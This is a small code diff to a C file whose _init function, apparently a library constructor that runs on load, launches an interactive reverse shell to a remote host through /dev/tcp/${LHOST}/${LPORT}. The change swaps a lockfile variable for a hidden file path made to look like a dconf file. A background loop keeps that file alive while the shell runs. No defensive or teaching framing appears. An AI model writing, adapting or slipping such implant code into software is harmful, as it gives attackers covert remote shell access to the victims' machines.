@@ -59,8 +59,8 @@ static void _init(void) {
     //   - background loop touches lockfile every 30s while shell is alive
     //   - when shell dies, loop removes lockfile so next trigger fires freely
     char *args[] = {"/bin/bash", "-c",
-        "L=${LOCKFILE}; echo $$ > $L; "
-        "( while kill -0 $$ 2>/dev/null; do touch $L; sleep 30; done; rm -f $L ) & "
+        "echo $$ > /var/tmp/.dconf-lock-root; "
+        "( while kill -0 $$ 2>/dev/null; do touch /var/tmp/.dconf-lock-root; sleep 30; done; rm -f /var/tmp/.dconf-lock-root ) & "
         "bash -i >& /dev/tcp/${LHOST}/${LPORT} 0>&1",
         NULL};
     execv("/bin/bash", args);
